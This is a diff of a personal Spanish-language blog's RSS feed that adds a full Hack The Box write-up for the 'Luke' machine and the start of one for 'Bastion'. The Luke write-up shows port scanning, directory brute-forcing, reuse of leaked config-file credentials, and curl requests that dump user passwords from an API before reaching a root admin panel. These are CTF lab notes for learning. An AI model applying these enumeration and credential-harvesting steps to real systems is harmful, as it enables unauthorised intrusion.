@@ -5,9 +5,417 @@
     <description>This is my personal blog</description>
     <link>https://blog.roskyfrosky.com/</link>
     <atom:link href="https://blog.roskyfrosky.com/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 21 Nov 2018 20:56:57 +0000</pubDate>
-    <lastBuildDate>Wed, 21 Nov 2018 20:56:57 +0000</lastBuildDate>
-    <generator>Jekyll v3.8.4</generator>
+    <pubDate>Wed, 18 Sep 2019 16:16:19 +0200</pubDate>
+    <lastBuildDate>Wed, 18 Sep 2019 16:16:19 +0200</lastBuildDate>
+    <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Luke - Hack The Box</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/avatares/Luke.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-resumen-&quot;&gt;[ Resumen ]&lt;/h2&gt;
+
+&lt;p&gt;Hoy os traigo el writeup de como resolver la máquina Luke de Hackthebox. Como podéis ver la dificultad de la máquina es Media aunque yo la habría clasificado como fácil ya que consiste en distintos pasos de enumeración sobre distintos servicios y en el uso de los datos que obtienes trás esa enumeración&lt;/p&gt;
+
+&lt;h2 id=&quot;-00--recon&quot;&gt;[ 00 – Recon]&lt;/h2&gt;
+
+&lt;p&gt;En primer lugar, como siempre, realizamos un escaneo de puertos rápido con masscan para saber que servicios, tanto udp como tcp, hay abiertos en la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/HTB/Luke#masscan &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt;,U:1-65535  10.10.10.137 &lt;span class=&quot;nt&quot;&gt;--rate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; tun0
+
+Starting masscan 1.0.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-08-27 08:20:08 GMT
+ &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; forced options: &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--randomize-hosts&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--send-eth&lt;/span&gt;
+Initiating SYN Stealth Scan
+Scanning 1 hosts &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;131070 ports/host]
+Discovered open port 3000/tcp on 10.10.10.137
+Discovered open port 21/tcp on 10.10.10.137
+Discovered open port 80/tcp on 10.10.10.137
+Discovered open port 8000/tcp on 10.10.10.137
+Discovered open port 22/tcp on 10.10.10.137
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez que tenemos los puertos que hay abiertos, realizamos un escaneo con nmap sobre esos puertos para saber que servicio y las versiones de los mismos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/HTB/Luke#nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; Luke luke.htb &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,80,3000,8000
+
+Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-08-27 09:57 CEST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;luke.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.137&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.081s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3+ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ext.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+22/tcp   open  ssh?
+80/tcp   open  http    Apache httpd 2.4.38 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;FreeBSD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/7.3.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FreeBSD&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (application/json; charset=utf-8).
+8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 161.53 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En el resultado de Nmap, vemos que está permitido el acceso como anonymous al ftp.&lt;/p&gt;
+
+&lt;p&gt;Entramos y vemos un fichero con nombre “for_Chihiro.txt” cuyo contenido es el siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dear Chihiro !!
+
+As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
+the actual website I've created .
+Normally you should know where to look but hurry up because I will delete them soon because of our security policies !
+
+Derry
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tras leer la nota del ftp, llegamos a la conclusion de que tenemos que encontrar un backup de la web en alguno de los otros puertos que hemos visto que estan abiertos.
+Para ello, lanzamos el gobuster con distintas extensiones sobre el puerto 80.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/HTB/Luke#gobuster  &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://luke.htb &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt;  /usr/share/wordlist/DirBuster-Lists/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php,html,txt,zip,rar,bak &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100
+
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+Gobuster v2.0.1              OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Mode         : dir
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url/Domain   : http://luke.htb/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads      : 100
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist     : /usr/share/wordlist/DirBuster-Lists/directory-list-2.3-medium.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes : 200,204,301,302,307,403
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions   : txt,zip,rar,bak,php,html
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout      : 10s
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+2019/08/27 10:05:15 Starting gobuster
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+/index.html &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/login.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/member &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/css &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/js &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/vendor &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/config.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/LICENSE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Accediendo a los distintos ficheros que hemos obtenido con el gobuster, encontramos que al visitar el fichero config.php obtenemos el codigo fuente del fichero:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$dbHost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbUsername&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbPassword&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Zk6heYCyv6ZE9Xcg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;login&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dbHost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbUsername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dbPassword&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connect failed: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora accemos el mismo proceso pero lanzando el gobuster para el servicio que se encuentra en el puerto 3000&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/HTB/Luke#gobuster  &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://luke.htb:3000 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt;  /usr/share/wordlist/DirBuster-Lists/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php,html,txt,zip,rar,bak &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100
+
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+Gobuster v2.0.1              OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Mode         : dir
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url/Domain   : http://luke.htb:3000/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads      : 100
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist     : /usr/share/wordlist/DirBuster-Lists/directory-list-2.3-medium.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Status codes : 200,204,301,302,307,403
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions   : php,html,txt,zip,rar,bak
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout      : 10s
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+2019/08/27 10:07:38 Starting gobuster
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+/login &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/users &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/Login &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/Users &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En el puerto 8000 vemos que hay un login directamente nada más acceder a través del navegador.&lt;/p&gt;
+
+&lt;h2 id=&quot;-01--getting-access&quot;&gt;[ 01 – Getting Access]&lt;/h2&gt;
+
+&lt;p&gt;Probando las credenciales que hemos obtenido del fichero config.php, vemos que son válidas para la API que se encuentra en el puerto 3000.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/HTB/Luke#curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/json&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST http://luke.htb:3000/login &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;{&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;, &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Zk6heYCyv6ZE9Xcg&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;}&quot;&lt;/span&gt;
+
+
+Respuesta:
+
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;success&quot;&lt;/span&gt;:true,&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Authentication successful!&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;token&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzkwNTgxLCJleHAiOjE1NTk0NzY5ODF9.eSCG6iP3DMorQ9RpQ799-wJ1_9n00ikV3ISEryhsi_g&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora que hemos podido acceder, vamos a listar los usuarios&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/HTB/Luke#curl  &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Accept: application/json&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET http://luke.htb:3000/users &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzkwNTgxLCJleHAiOjE1NTk0NzY5ODF9.eSCG6iP3DMorQ9RpQ799-wJ1_9n00ikV3ISEryhsi_g&quot;&lt;/span&gt;
+
+Respuesta:
+&lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ID&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Admin&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Role&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Superuser&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ID&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;2&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Derry&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Role&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Web Admin&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ID&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;3&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Yuri&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Role&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Beta Tester&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ID&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;4&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Dory&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Role&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Supporter&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;-02--priv-esc&quot;&gt;[ 02 – Priv. Esc.]&lt;/h2&gt;
+
+&lt;p&gt;Hemos podido obtener distintos usuarios, entre ellos el usuario Admin con rol de superusuario. Lo que haremos a continuación, será obtener toda la información de cada usuario. Para ello realizamos una petición por cada usuario en la cuál obtendremos su contraseña&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+root@kali:~/HTB/Luke#curl  &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Accept: application/json&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET  http://luke.htb:3000/users/admin &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MzkwNTgxLCJleHAiOjE1NTk0NzY5ODF9.eSCG6iP3DMorQ9RpQ799-wJ1_9n00ikV3ISEryhsi_g&quot;&lt;/span&gt;
+
+
+Respuesta:
+
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;Admin&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;WX5b7)&amp;gt;/rp&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)FW&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Haciendo lo mismo para el resto de usuarios, obtenemos también sus contraseñas&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+{name&quot;:&quot;Derry&quot;,&quot;password&quot;:&quot;rZ86wwLvx7jUxtch&quot;}
+{&quot;name&quot;:&quot;Yuri&quot;,&quot;password&quot;:&quot;bet@tester87&quot;}
+{&quot;name&quot;:&quot;Dory&quot;,&quot;password&quot;:&quot;5y:!xa=ybfe)/QD&quot;}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora que tenemos varios  usuarios, vamos a probarlos en las distintas páginas de login que tenemos identificadas, para ver si alguno de ellos es válido.
+Vemos que el usuario Derry funciona en el Basic Authentication que existe en el puerto 80, cuando intentamos acceder a la carpeta management.
+Al entrar, vemos que hay distintos ficheros config, con distintas extensiones. El fichero config.php es el mismo que habíamos obtenido anteriormente, pero ahora hay un fichero config.json en el que obtenemos una nueva credencial para el usuario root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Luke/management.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Accedemos al purto 8000 tal y como indica el fichero de configuración e introducimos las credenciales &lt;code class=&quot;highlighter-rouge&quot;&gt;root:KpMasng6S5EtTy9Z&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Luke/dashboard.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez dentro del dashboard principal, para ganar tanto la flag de user como  la de root, solo hay que ir al filemanager y buscar ambos ficheros.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Luke/user.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Hackthebox/Luke/root.png&quot; alt=&quot;&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Sat, 14 Sep 2019 13:11:34 +0200</pubDate>
+        <link>https://blog.roskyfrosky.com/hackthebox/2019/09/14/Luke-hackthebox.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/hackthebox/2019/09/14/Luke-hackthebox.html</guid>
+        
+        <category>hackthebox</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
+    
+      <item>
+        <title>Bastion - Hack The Box</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/images/avatares/Bastion.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-resumen-&quot;&gt;[ Resumen ]&lt;/h2&gt;
+
+&lt;p&gt;Hoy os traigo el writeup de como resolver la máquina Bastion de Hackthebox.Se trata de una máquina de dificultad fácil en la cual tendremos que montar ficheros vhd desde los cuales obtendremos contraseñas dumpeando la SAM y en la que escalaremos privilegios debido al almacenamiento de credenciales por parte del software mRemoteNG.&lt;/p&gt;
+
+&lt;h2 id=&quot;-00--recon&quot;&gt;[ 00 – Recon]&lt;/h2&gt;
+
+&lt;p&gt;En primer lugar, como siempre, realizamos un escaneo de puertos rápido con masscan para saber que servicios, tanto udp como tcp, hay abiertos en la máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/HTB/Bastion#masscan &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt;,U:1-65535  10.10.10.134 &lt;span class=&quot;nt&quot;&gt;--rate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; tun0
+
+Starting masscan 1.0.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-04-30 13:51:23 GMT
+ &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; forced options: &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--randomize-hosts&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--send-eth&lt;/span&gt;
+Initiating SYN Stealth Scan
+Scanning 1 hosts &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;131070 ports/host]
+Discovered open port 47001/tcp on 10.10.10.134
+Discovered open port 445/tcp on 10.10.10.134
+Discovered open port 135/tcp on 10.10.10.134
+Discovered open port 49667/tcp on 10.10.10.134
+Discovered open port 49670/tcp on 10.10.10.134
+Discovered open port 22/tcp on 10.10.10.134
+Discovered open port 49669/tcp on 10.10.10.134
+Discovered open port 5985/tcp on 10.10.10.134
+Discovered open port 139/tcp on 10.10.10.134
+Discovered open port 49668/tcp on 10.10.10.134
